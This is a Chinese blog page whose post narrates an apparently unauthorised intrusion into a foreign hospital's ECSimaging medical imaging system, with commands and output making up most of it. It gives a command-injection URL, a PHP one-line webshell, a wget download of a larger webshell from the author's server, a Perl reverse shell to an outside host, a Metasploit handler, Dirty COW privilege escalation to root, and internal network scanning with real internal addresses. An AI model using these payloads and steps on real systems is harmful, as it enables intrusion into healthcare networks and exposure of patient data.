<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"wanheiqiyihu.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="潜心学习，不骄不躁">
<meta property="og:type" content="website">
<meta property="og:title" content="十三の博客">
<meta property="og:url" content="https://wanheiqiyihu.top/page/19/index.html">
<meta property="og:site_name" content="十三の博客">
<meta property="og:description" content="潜心学习，不骄不躁">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="十三">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://wanheiqiyihu.top/page/19/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>十三の博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">十三の博客</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-ctf做题笔记">

    <a href="/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>

  </li>
        <li class="menu-item menu-item-python">

    <a href="/categories/python" rel="section"><i class="download fa-fw"></i>python</a>

  </li>
        <li class="menu-item menu-item-java">

    <a href="/categories/java" rel="section"><i class="download fa-fw"></i>java</a>

  </li>
        <li class="menu-item menu-item-读书笔记">

    <a href="/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>

  </li>
        <li class="menu-item menu-item-渗透测试">

    <a href="/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>

  </li>
        <li class="menu-item menu-item-基础">

    <a href="/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>

  </li>
        <li class="menu-item menu-item-轮子">

    <a href="/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>

  </li>
        <li class="menu-item menu-item-漏洞库">

    <a href="/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>

  </li>
        <li class="menu-item menu-item-工具">

    <a href="/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>

  </li>
        <li class="menu-item menu-item-代码审计">

    <a href="/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>

  </li>
        <li class="menu-item menu-item-逆向">

    <a href="/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>

  </li>
        <li class="menu-item menu-item-应急响应">

    <a href="/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>

  </li>
        <li class="menu-item menu-item-免杀">

    <a href="/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>

  </li>
        <li class="menu-item menu-item-靶场">

    <a href="/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>

  </li>
        <li class="menu-item menu-item-cve申请">

    <a href="/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>

  </li>
        <li class="menu-item menu-item-c语言">

    <a href="/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/" class="post-title-link" itemprop="url">【实战】从rce到上马到脏牛提权到内网</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-07 19:56:50" itemprop="dateCreated datePublished" datetime="2023-03-07T19:56:50+08:00">2023-03-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-01-24 23:29:24" itemprop="dateModified" datetime="2024-01-24T23:29:24+08:00">2024-01-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="【实战】从rce到上马到脏牛提权到内网"><a href="#【实战】从rce到上马到脏牛提权到内网" class="headerlink" title="【实战】从rce到上马到脏牛提权到内网"></a>【实战】从rce到上马到脏牛提权到内网</h1><h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到一个战，得知是ECSimaging</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212212721477.png" alt="image-20230212212721477"></p>
<p>这是一个国外的医疗管理系统，长这样</p>
<p>后续我们在github上面找到这套系统的rce漏洞</p>
<p><code>/new_movie.php?studyUID=1&amp;start=2&amp;end=2&amp;file=1;pwd</code></p>
<p>上面是poc</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212212853107.png" alt="image-20230212212853107"></p>
<p>看到成功执行命令。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>直接用exp打的没意思</p>
<p>但是ls之后我发现存在一个<a target="_blank" rel="noopener" href="http://www.tar网站备份的文件.于是我决定下载下来对这个漏洞进行研究/">www.tar网站备份的文件。于是我决定下载下来对这个漏洞进行研究</a></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213180055117.png" alt="image-20230213180055117"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213142620037.png" alt="image-20230213142620037"></p>
<p>直接找到漏洞触发的点，new_movie.php。</p>
<p>打开文件进行审计,关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>(<span class="variable">$studyUID</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$start</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$end</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$file</span>) )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;studyUID: &#x27;</span>.<span class="variable">$studyUID</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;start: &#x27;</span>.<span class="variable">$start</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;end: &#x27;</span>.<span class="variable">$end</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;file: &#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$start_time</span> = gmdate(<span class="string">&quot;H:i:s&quot;</span>, <span class="variable">$start</span>);</span><br><span class="line">	<span class="variable">$duration_time</span> = gmdate(<span class="string">&quot;H:i:s&quot;</span>, <span class="variable">$end</span>-<span class="variable">$start</span>);	</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$output_file</span> = <span class="string">&#x27;/var/www&#x27;</span>.str_replace(<span class="string">&#x27;.mp4&#x27;</span>,<span class="string">&#x27;_&#x27;</span>.time().<span class="string">&#x27;.mp4&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;output: &#x27;</span>.<span class="variable">$output_file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="variable">$cmd</span> = <span class="string">&#x27;ffmpeg -ss &#x27;</span>.<span class="variable">$start_time</span>.<span class="string">&#x27; -t &#x27;</span>.<span class="variable">$duration_time</span>.<span class="string">&#x27; -vcodec copy -acodec copy -i /var/www&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$output_file</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	exec( <span class="variable">$cmd</span>.<span class="string">&#x27; 2&gt;&amp;1&#x27;</span>, <span class="variable">$output</span> );</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	print_r(<span class="variable">$output</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>首先是接收了这四个参数，<code>studyUID</code>,<code>start</code>,<code>end</code>,<code>file</code>。可以看到下面的cmd变量，代码中直接将接收到的参数拼接到output_file变量中了，虽然有个<code>str_replace</code>函数，但是并不影响，因为我们的<code>file</code>变量中没有.mp4去给函数进行替换，所以就直接将<code>file</code>拼接到<code>output_file</code>变量中了，<code>output_file</code>变量是放在cmd变量最后的，而且没有经过任何过滤传入exec函数中。</p>
<p>那么这个时候就可用linux分号来分割命令，实现rce。除了分号当然也可以用||，&amp;&amp;等等，但是分号是顺序地独立执行各条命令, 彼此之间不关心是否失败, 所有命令都会执行。</p>
<h2 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h2><p>我最开始拿到这样一个rce的时候，最先想到的是通过命令写入一句话木马，用哥斯拉或者是其他的webshell管理工具，方便后续的操作。</p>
<p><code>echo &#39;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#39; &gt;xiaomaomi.php</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213224258.png" alt="image-20230212213224258"></p>
<p>这里可以看到，我们的小猫咪木马确实是写进去了的。但是访问的时候却解析为500.</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213255376.png" alt="image-20230212213255376"></p>
<p>我尝试过使用市面上的一些简易免杀版本，同样为500。让我不得不怀疑，这个机器上面存在杀软。</p>
<p>而且我尝试访问过当前目录下的其他php文件，是确实解析了。</p>
<p>甚至cat也能看到文件中的内容</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213536297.png" alt="image-20230212213536297"></p>
<p>但是xiaomaomi就是不执行。我尝试过比较大的免杀马，但是却有url长度的限制，导致无法写入。</p>
<h2 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h2><p>当我无法上传木马的时候，我的思路是反弹一个会话，不管是nc也好，msf也好。我都可以更方便的操作。</p>
<p>于是开启了我的花生壳对我的kali虚拟机进行了一个内网穿透，开了个nc监听。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220132263.png" alt="image-20230212220132263"></p>
<p>但是都没有什么实质性的进展，最后那个whoami是我用自己的服务器实验了一下内网穿透，就是酱紫。</p>
<p>我把几乎能用到的反弹shell的命令几乎都用上了，就是弹不回来</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220453965.png" alt="image-20230212220453965"></p>
<p>我怀疑也是防火墙的出网策略或者是杀软搞的鬼。（后来我想可能是php函数的问题，有知道的师傅可以解释一波）</p>
<p>尝试pingdnslog，确定机器确实是出网的</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220928123.png" alt="image-20230212220928123"></p>
<h2 id="尝试3（成功）"><a href="#尝试3（成功）" class="headerlink" title="尝试3（成功）"></a>尝试3（成功）</h2><p>思路回到了上传木马的地方，我不能肯定是不是这些webshell的问题，既然命令写不进去，那我们就放到vps上让服务器去主动下载。</p>
<p>那我们拿自己的vps开一个http服务。</p>
<p>这边开http服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install python3 python3-pip</span><br><span class="line">pip3 install simplefileserver</span><br><span class="line">simplefileserver 8989 </span><br><span class="line">随后访问你的vps的8989端口就可以</span><br></pre></td></tr></table></figure>

<p>然后wget上传大马</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212222541392.png" alt="image-20230212222541392"></p>
<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><p>既然是一个医院的系统，我想应该会有内网吧。</p>
<p>不管是不是内网，我们现在的权限还不是root</p>
<p>先看看这个机器的内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux ecsprod-oldbackup 3.2.0-4-amd64 #1 SMP Debian 3.2.57-3+deb7u1 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">是3.2.0-4-amd64</span><br></pre></td></tr></table></figure>

<p>而且我还扫了一下这儿ip的端口，发现22端口居然没开，我本来打算加密钥直接上ssh的，没开22就算了吧，还是先弹个shell回来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;vpsip&quot;;$p=35932;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>

<p>msf打开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  cmd/unix/reverse_bash</span><br><span class="line">set lport  7777</span><br><span class="line">set lhost  172.16.1.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>这次用大妈就弹成功了(我试过的，只有大妈能弹，用之前rce漏洞弹不了)，再次给kali内网穿透，得到一个msf会话。</p>
<p>我看这个版本的linux应该是可以用脏牛的，现在就试试</p>
<p>这是github上面脏牛的exp</p>
<p><code>https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c</code></p>
<p>直接给他wget到tmp目录下面</p>
<p>然后编译<code>gcc -pthread dirty.c -o dirty -lcrypy</code></p>
<p>但是编译的时候，提示没有相关动态库，而且，我还发现了一个问题。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213000743643.png" alt="image-20230213000743643"></p>
<p>上面是提示没有动态库，于是决定换一个exp</p>
<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>换了个exp，顺便用nc在我的vps上弹了个会话（msf有点卡）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提前换成交互式shell</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004422893.png" alt="image-20230213004422893"></p>
<p><code>wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c</code></p>
<p><code>gcc -pthread dirty.c -o dirty -lcrypt</code>编译一下</p>
<p><code>./dirty 123456</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004538455.png" alt="image-20230213004538455"></p>
<p>等待提权成功</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004917209.png" alt="image-20230213004917209"></p>
<p>提权成功了！</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213005306922.png" alt="image-20230213005306922"></p>
<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="资产探测"><a href="#资产探测" class="headerlink" title="资产探测"></a>资产探测</h3><p>暂且不管是不是虚拟机，我们arp -a看看</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213172555433.png" alt="image-20230213172555433"></p>
<p>貌似还有4台机器啊</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">也就是说这个网段里面加上我拿下的这台机器，一共有5台机器</span><br><span class="line">本机192.168.1.70</span><br><span class="line"></span><br><span class="line">另外三台</span><br><span class="line">? (192.168.1.206) at 00:11:32:eb:41:08 [ether] on eth0</span><br><span class="line">? (192.168.1.111) at 00:11:32:ee:80:15 [ether] on eth0</span><br><span class="line">? (192.168.1.105) at 00:0c:29:31:da:67 [ether] on eth0</span><br><span class="line">DSR-1000AC (192.168.1.1) at f0:b4:d2:23:d3:67 [ether] on eth0</span><br><span class="line">（其中105是第二天出现的，第一天我没看到）</span><br></pre></td></tr></table></figure>

<p>这里我顺便看了看，这个名为DSR-1000AC的机器是路由器。（找了一下没发现路由器的漏洞）</p>
<p>这里先进行存活网段的探测,使用的工具名为netspy，github上面搜得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ./netspy</span><br><span class="line">./netspy -x is #注：急速模式协程数量为cpu核数*40，只探测段内网关。</span><br></pre></td></tr></table></figure>

<p>以下是扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./netspy -x is</span><br><span class="line">[INFO] 2023/02/13 11:40 use icmp protocol to spy</span><br><span class="line">[INFO] 2023/02/13 11:40 192.168.0.0/16 is from 192.168.0.0 to 192.168.255.255</span><br><span class="line">[INFO] 2023/02/13 11:40 172.16.0.0/12 is from 172.16.0.0 to 172.31.255.255</span><br><span class="line">[INFO] 2023/02/13 11:40 10.0.0.0/8 is from 10.0.0.0 to 10.255.255.255</span><br><span class="line">2023/02/13 11:40 192.168.1.1/24</span><br><span class="line">2023/02/13 11:40 192.168.0.1/24</span><br><span class="line">2023/02/13 11:40 192.168.5.1/24</span><br><span class="line">2023/02/13 11:40 192.168.215.1/24</span><br></pre></td></tr></table></figure>

<p>大概也就是这四个存活网段<code>1\0\5\215</code></p>
<p>然后上fscan，开扫。（由于爆破ftp服务会让fscan卡住，我们就不要爆破ftp了）这些服务的密码我后续来爆破。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 192.168.1.1/24 -nobr -o 1.txt</span><br><span class="line">./fscan_amd64 -h 192.168.0.1/24 -nobr -o 0.txt</span><br><span class="line">./fscan_amd64 -h 192.168.5.1/24 -nobr -o 5.txt</span><br><span class="line">./fscan_amd64 -h 192.168.215.1/24 -nobr -o 215.txt</span><br></pre></td></tr></table></figure>

<p>拿到输出结果之后，我们用这个工具优化一下输出结果。<code>fscanOutput</code></p>
<p>扫描结果大致如下，因为我们使用了nobr参数，就导致了不会检测漏洞，我之前扫的时候检测到了ms17010,但是因为爆破ftp卡住了。</p>
<p>后面我们单独列一个表来给fscan跑，之前跑的大部分如下</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215105594.png" alt="image-20230213215105594"><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215111766.png" alt="image-20230213215111766"></p>
